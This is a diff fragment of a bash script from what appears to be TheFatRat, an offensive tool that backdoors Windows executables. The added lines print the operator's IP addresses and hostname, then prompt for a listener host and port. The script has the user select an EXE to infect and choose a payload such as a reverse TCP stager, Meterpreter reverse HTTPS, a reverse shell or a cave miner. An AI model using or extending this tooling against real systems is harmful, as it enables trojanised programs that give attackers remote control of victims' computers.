   				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
@@ -2627,7 +2905,11 @@ echo
       then
         echo ""
         spinlong
-        echo ""
+echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
         read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira;
         embed=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your executable file");
         payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
